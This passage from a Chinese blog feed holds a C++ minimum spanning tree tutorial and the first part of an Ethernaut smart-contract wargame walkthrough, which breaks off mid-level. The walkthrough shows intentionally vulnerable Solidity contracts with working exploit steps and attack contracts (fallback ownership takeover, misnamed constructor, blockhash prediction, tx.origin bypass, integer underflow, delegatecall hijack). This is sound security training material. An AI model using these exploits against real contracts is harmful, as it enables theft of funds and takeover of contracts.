<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307112034.png" class>]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>两种方法求最小生成树</title>
    <url>/2020/10/15/%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95%E6%B1%82%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/</url>
    <content><![CDATA[<h2 id="Prim算法"><a href="#Prim算法" class="headerlink" title="Prim算法"></a><code>Prim</code>算法<a id="more"></a></h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXLEN 28</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="keyword">int</span> graph[MAXLEN][MAXLEN], minDis[MAXLEN];</span><br><span class="line"><span class="keyword">bool</span> visited[MAXLEN];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prim</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(visited,<span class="literal">false</span>,<span class="keyword">sizeof</span>(visited));</span><br><span class="line">    minDis[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    visited[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 初始化各个点到最小生成树点集，即初始点的距离</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n;i++)</span><br><span class="line">        minDis[i] = graph[<span class="number">0</span>][i] == <span class="number">0</span> ? INF : graph[<span class="number">0</span>][i];</span><br><span class="line">    <span class="comment">// 循环 n-1 次即可</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> u = <span class="number">-1</span>,minD = INF;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; n;j++)&#123;</span><br><span class="line">            <span class="comment">// 找出连接两个集合中最短边的点</span></span><br><span class="line">            <span class="keyword">if</span>(!visited[j] &amp;&amp; minD &gt; minDis[j])&#123;</span><br><span class="line">                u = j;</span><br><span class="line">                minD = minDis[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sum += minD;</span><br><span class="line">        visited[u] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j&lt; n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[j] &amp;&amp; graph[u][j] != <span class="number">0</span> &amp;&amp; graph[u][j] &lt; minDis[j])&#123;</span><br><span class="line">                <span class="comment">// 更新该点到最小生成树点集的距离</span></span><br><span class="line">                minDis[j] = graph[u][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; sum &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Kruskal算法（配合并查集）"><a href="#Kruskal算法（配合并查集）" class="headerlink" title="Kruskal算法（配合并查集）"></a><code>Kruskal</code>算法（配合并查集）</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> path[<span class="number">102</span>], parent[<span class="number">102</span>];</span><br><span class="line"><span class="keyword">int</span> n, edgeNum;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">villageEdge</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> u;</span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line">    <span class="keyword">int</span> dist;</span><br><span class="line">&#125;;</span><br><span class="line">villageEdge villages[<span class="number">5202</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">myCmp</span><span class="params">(villageEdge a, villageEdge b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.dist &lt; b.dist;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getParent</span><span class="params">(<span class="keyword">int</span> son)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p = parent[son];</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="number">0</span>) parent[son] = son;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (p != son) parent[son] = getParent(p);</span><br><span class="line">    <span class="keyword">return</span> parent[son];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MST</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> uParent, vParent, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; edgeNum;i++)&#123;</span><br><span class="line">        uParent = getParent(villages[i].u);</span><br><span class="line">        vParent = getParent(villages[i].v);</span><br><span class="line">        <span class="keyword">if</span>(vParent != uParent)&#123;</span><br><span class="line">            sum += villages[i].dist;</span><br><span class="line">            <span class="keyword">if</span>(path[uParent] &lt; path[vParent])&#123;</span><br><span class="line">                parent[uParent] = vParent;</span><br><span class="line">                path[vParent]++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                parent[vParent] = uParent;</span><br><span class="line">                path[uParent]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>最小生成树</tag>
      </tags>
  </entry>
  <entry>
    <title>【Ethernaut闯关录】上篇</title>
    <url>/2023/03/04/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%8A%E7%AF%87/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>无意中遇到一个网站<a href="https://ethernaut.openzeppelin.com/" target="_blank" rel="noopener">【Ethernaut】</a>，类似于<code>ctf</code>平台一样，该网站有大概30个关卡，每个关卡都会考察一些智能合约的内容，正好把学来的知识实践一下，毕竟纸上得来终觉浅，绝知此事要躬行。</p>
<p>本篇是第一部分，主要涉及构造函数、<code>tx.origin</code>使用注意事项、整数溢出、<code>delegatecall</code>、<code>selfdestruct</code>等知识。</p>
<a id="more"></a>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li>metamask：我使用的是chrome浏览器，安装这个插件比较容易，微软的edge也可以，而且后者下载插件比较简单</li>
<li>以太坊测试网：Goerli和Sepolia都可以，测试代币可分别在<a href="https://goerli-faucet.pk910.de/" target="_blank" rel="noopener">【1】</a>和<a href="https://sepolia-faucet.pk910.de/" target="_blank" rel="noopener">【2】</a>处获取，虽然得到的不多，但是足够完成所有关卡了。</li>
<li>remix：solidity编译器，有桌面版和网页在线版，我是用的是网页版，这是<a href="https://remix.ethereum.org" target="_blank" rel="noopener">【链接】</a>。桌面版无法连接metamask，有些关卡需要我们部署一些合约，对于remix网页版比较方便。</li>
</ul>
<p>好，以上条件都准备好以后，我们就可以开启我们的闯关之旅了！</p>
<h2 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h2><p>这一关卡主要是熟悉本游戏的操作运用，不过说实话，本关卡我认为并不是最简单的，没有些脑洞，根本没法通关。</p>
<p>因此在控制台输入以下函数即可通关：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.info()</span><br><span class="line"><span class="keyword">await</span> contract.info1()</span><br><span class="line"><span class="keyword">await</span> contract.info2(<span class="string">'hello'</span>)</span><br><span class="line"><span class="keyword">await</span> contract.infoNum()</span><br><span class="line"><span class="keyword">await</span> contract.info42()</span><br><span class="line"><span class="keyword">await</span> contract.theMethodName()</span><br><span class="line"><span class="keyword">await</span> contract.method7123949()</span><br><span class="line"><span class="keyword">await</span> contract.password()</span><br><span class="line"><span class="keyword">await</span> contract.authenticate(<span class="string">'ethernaut0'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address &#x3D;&gt; uint) public contributions;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    contributions[msg.sender] &#x3D; 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">  &#x2F;&#x2F; 要求发送过来的小于 0.001</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    &#x2F;&#x2F; 如果发起方的贡献大于合约拥有者的贡献，则归属权转换</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;&#x2F; 只有合约拥有者才能发起退款</span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    payable(owner).transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;&#x2F; 注意这里是利用点</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件：</strong></p>
<ol>
<li>获得合约所有权</li>
<li>将合约所有者的余额清零</li>
</ol>
<p>要想改变合约的owner可以通过两种方法实现：</p>
<ol>
<li>不断调用contribute()函数</li>
<li>合约接收没有数据的纯ether(例如：转账函数))</li>
</ol>
<p>第一个不现实，我们使用第二个。</p>
<p>攻击步骤：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract.contribute(&#123;value: 1&#125;) &#x2F;&#x2F;首先使贡献值大于0</span><br><span class="line">contract.sendTransaction(&#123;value: 1&#125;) &#x2F;&#x2F;触发fallback函数</span><br><span class="line">contract.withdraw() &#x2F;&#x2F;将合约的balance清零</span><br></pre></td></tr></table></figure>

<h2 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#x2F;* constructor *&#x2F;</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    allocations[owner] &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        require(</span><br><span class="line">	            msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">	            &quot;caller is not the owner&quot;</span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line">&#x2F;&#x2F; 调用方份额增加</span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] &#x3D; allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;&#x2F; 向allocator转账数量为 allocations[allocator]</span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;&#x2F; 向发起方转账所有的（合约的）余额</span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：获得合约所有权。</p>
<p>虽然代码中没有任何关于获取所有权的代码，但是仔细一看，发现构造函数写错了，因此所有人都可以调用<code>Fal1out()</code>函数来获得权限。</p>
<p>攻击步骤：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">await contract.Fal1out(&#123;value: 1&#125;)</span><br></pre></td></tr></table></figure>

<p>然后submit</p>
<h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    consecutiveWins &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue &#x3D; uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">    if (lastHash &#x3D;&#x3D; blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash &#x3D; blockValue;</span><br><span class="line">    uint256 coinFlip &#x3D; blockValue &#x2F; FACTOR;</span><br><span class="line">    bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line"></span><br><span class="line">   &#x2F;&#x2F; 要猜 side 的变量的值</span><br><span class="line">    if (side &#x3D;&#x3D; _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins &#x3D; 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：将<code>consecutiveWins</code>增加到10</p>
<p>题意是要我们“猜“上一个区块的哈希值转为<code>uint256</code>后，除以FACTOR后是不是1，要连续猜对10次，注意每次都要等新区快出现后才调用，否则会触发<code>lastHash == blockValue</code>。</p>
<p>看上去，很难猜得中，但是实际上区块的哈希我是<strong>可以获取到</strong>的！在控制台输入<code>help()</code>发现只有<code>getBlockNumber()</code>函数可以使用，无法使用<code>blockhash()</code>函数，看来不能仅使用控制台了。</p>
<p>实际上，我们可以使用一个辅助的合约，在合约中使用<code>blockhash</code>函数，部署和调用合约，我这里使用remix，然后将其连接到metamask中，连接过程可参考<a href="https://www.freesion.com/article/87861092736/#:~:text=%E4%BD%BF%E7%94%A8remix%E4%B8%8EMetaMask%E8%BF%9B%E8%A1%8C%E5%8F%91%E5%B8%83%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%EF%BC%88%E4%BB%A3%E5%B8%81%EF%BC%89%E6%9C%80%E5%85%A8%E6%95%99%E7%A8%8B%201%20%E5%9C%A8%E7%BA%BF%E7%BC%96%E8%BE%91%E5%99%A8%E5%9C%B0%E5%9D%80%20%E7%BC%96%E8%BE%91%E5%99%A8%E5%9C%B0%E5%9D%80%20%E8%AF%B7%E6%B3%A8%E6%84%8F%E5%A6%82%E6%9E%9C%E7%BC%96%E8%BE%91%E5%99%A8%E6%97%A0%E6%B3%95%E4%B8%8EMetaMask%E8%BF%9E%E6%8E%A5%E7%9A%84%E6%97%B6%E5%80%99%E7%94%A8%20http,%E5%8D%8F%E8%AE%AE%E6%89%93%E5%BC%80%EF%BC%8C%E4%B8%8D%E8%A6%81%E7%94%A8%20https%20%2C%E6%88%91%E4%B9%9F%E4%B8%8D%E7%9F%A5%E9%81%93%E4%B8%BA%E4%BB%80%E4%B9%88%EF%BC%8C%E6%9C%89%E6%97%B6%E5%80%99%E4%BC%9A%E5%8F%91%E7%94%9F%E8%BF%99%E7%A7%8D%E4%BA%8B%E6%83%85%EF%BC%8C%E6%8D%A2%E4%B8%AA%E5%8D%8F%E8%AE%AE%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5%E3%80%82%20https%E5%85%B6%E5%AE%9E%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5%EF%BC%8C%E4%B8%8D%E8%A6%81%E8%A7%89%E5%BE%97%E5%8F%AA%E6%9C%89http%E5%8F%AF%E4%BB%A5%E8%BF%9E%E6%8E%A5%202%20%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%201.remix%E4%B8%8EMetaMask%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5" target="_blank" rel="noopener">【使用REMIX与METAMASK进行发布智能合约（代币）最全教程】</a></p>
<p>下面是攻击合约：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface CoinFlip &#123;</span><br><span class="line">  function flip(bool _guess) external returns (bool) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CoinFlipAttack &#123;</span><br><span class="line">	&#x2F;&#x2F; 该地址可以在控制台中输入 &#96;await contract&#96; 获取</span><br><span class="line">    CoinFlip constant private target &#x3D; CoinFlip(0xbE079d11154090c4337c8958c33cD8D5Dc0409B1);</span><br><span class="line">    uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        uint256 blockValue &#x3D; uint256(blockhash(block.number-1));</span><br><span class="line">        uint256 coinFlip &#x3D; blockValue &#x2F; FACTOR;</span><br><span class="line">        bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line">        target.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不断调用<code>attack()</code>函数，直至在控制台调用<code>await contract.consecutiveWins()</code>的返回值大于10，即可进行提交</p>
<h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><p>先看合约代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin !&#x3D; msg.sender) &#123;</span><br><span class="line">      owner &#x3D; _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：获取合约的所有权。</p>
<p>代码很少啊，但是很清晰，里边使用了<code>tx.origin</code>，这个是返回最初发起交易的地址，比如说，A要发送一个交易给B，B将其转发到C，此时对于C来说，<code>tx.origin</code>就是<code>A</code>的地址。这么说有点不太正确，引用<a href="https://learnblockchain.cn/article/3568" target="_blank" rel="noopener">【登链社区】</a>的说法吧：</p>
<blockquote>
<p><strong>msg.sender:</strong> 指直接调用智能合约功能的帐户或智能合约的地址<br><strong>tx.origin:</strong> 指调用智能合约功能的账户地址，只有账户地址可以是tx.origin</p>
</blockquote>
<p>那我们可以直接部署某个智能合约，在该合约中，调用<code>changeOwner</code>函数即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">  function changeOwner(address _owner) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TelephoneAttack &#123;</span><br><span class="line">	&#x2F;&#x2F; 该地址可以在控制台中输入 &#96;await contract&#96; 获取</span><br><span class="line">    Telephone constant private target &#x3D; Telephone(0xAcCE018DCB481A326A05E16f6F33f13C63FcC50A);</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        target.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在控制台输入<code>await contract.owner()</code>后，如果返回的是我们的用户地址，则说明我们已经成功拿下合约的所有权。</p>
<h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address &#x3D;&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; totalSupply &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;&#x3D; 0);</span><br><span class="line">    balances[msg.sender] -&#x3D; _value;</span><br><span class="line">    balances[_to] +&#x3D; _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：增加你手中的 token 数量</p>
<p>想要增加我们的代币量，一种方法是合约所有者调用<code>transfer</code>函数给我们发送代币，但是实际上我们无法冒充合约所有者，因此这种方法并不现实。</p>
<p>实际上本关卡考察的是溢出，<code>uint</code>是<code>uint256</code>的别名，该类型数据只能表示$[0,2^{256}-1]$，该类型的数据达到所能表示的最大值后，如果再加1，就会变成0.</p>
<p>我们再来看如何绕过<code>require(balances[msg.sender] - _value &gt;= 0)</code>。</p>
<p>实际上我们只要调用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.transfer(<span class="string">'0xD8D2f3E5833B51a1b38e3e95f65d79C976DFffae'</span>, <span class="number">21</span>)</span><br></pre></td></tr></table></figure>

<p>即可，其中，<code>0xD8D2f3E5833B51a1b38e3e95f65d79C976DFffae</code>是一个和<code>player</code>不同的<strong>有效账户地址</strong>。</p>
<p>因为一开始我们的<code>player</code>的余额是20，其减去21，由于溢出，<code>balances[msg.sender] - _value</code>是一个256表示的最大值。</p>
<h2 id="Delatation"><a href="#Delatation" class="headerlink" title="Delatation"></a>Delatation</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) &#123;</span><br><span class="line">    owner &#x3D; _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) &#123;</span><br><span class="line">    delegate &#x3D; Delegate(_delegateAddress);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) &#x3D; address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：获取<code>Delegation</code>合约的所有权。</p>
<p>考察的是<code>delegatecall</code>用法，引用<a href="https://learnblockchain.cn/docs/solidity/introduction-to-smart-contracts.html?highlight=delegatecall" target="_blank" rel="noopener">【官方文档】</a>对其的介绍：</p>
<blockquote>
<p>有一种特殊类型的消息调用，被称为 <strong>委托调用(\</strong>delegatecall*<em>)*</em> 。它和一般的消息调用的区别在于，目标地址的代码将在发起调用的合约的上下文中执行，并且 <code>msg.sender</code> 和 <code>msg.value</code> 不变。 这意味着一个合约可以在运行时从另外一个地址动态加载代码。存储、当前地址和余额都指向发起调用的合约，只有代码是从被调用地址获取的。 这使得 Solidity 可以实现”库“能力：可复用的代码库可以放在一个合约的存储上，如用来实现复杂的数据结构的库。</p>
</blockquote>
<p>实际上：</p>
<ul>
<li><code>call</code>：<code>msg</code>变量会修改为<strong>调用者</strong>，执行环境为<strong>被调用者</strong>的运行环境</li>
<li><code>delegatecall</code>：<code>msg</code>变量<strong>不变</strong>，执行环境为<strong>调用者</strong>的运行环境</li>
<li><code>callcode</code>：<code>msg</code>变量会修改为调用者，执行环境为<strong>调用者</strong>的运行环境</li>
</ul>
<p>看上去有点绕，举个例子，假如你调用（使用<code>call</code>的方式）一个合约A中的某个函数，这个函数又使用<code>delegatecall</code>的方式调用了合约B的函数，如果合约B中的函数发生了状态（<code>storage</code>）改变，<strong>则改变的是A中的状态</strong>，同时，在B看来，<strong>msg的值是和你相关的</strong>（即msg.sender是你的地址）</p>
<p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230218130024.png" alt></p>
<p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230218130226.png" alt></p>
<p>回归到本关卡，我们要想办法执行<code>fallback()</code>函数，然后想办法借助<code>delegatecall</code>函数执行<code>pwn</code>函数，如此一来，就能改变<code>Delegation</code>合约中的<code>owner</code>变量了，具体而言，是改成我们的地址。</p>
<p><code>delegatecall</code>用法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">address.delegatecall(二进制编码数据)</span><br></pre></td></tr></table></figure>

<p>二进制编码利用结构化编码函数 abi.encodeWithSignature 获得：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;函数签名&quot;,逗号分隔的具体参数)</span><br></pre></td></tr></table></figure>

<p>例如<code>abi.encodeWithSignature(&quot;f1(uint256,address)&quot;,_x, _addr)</code></p>
<p>对于本关卡，我们可以借助一个合约：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract T &#123;</span><br><span class="line">    function foo() pure public returns(bytes memory result)&#123;</span><br><span class="line">        result &#x3D; abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署后，调用<code>foo</code>函数可以得到返回值<code>0xdd365b8b</code>。</p>
<p>然后我们可以在控制台中输入：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.sendTransaction(&#123;<span class="attr">data</span>:<span class="string">'0xdd365b8b'</span>&#125;);</span><br></pre></td></tr></table></figure>

<p>然后查询</p>
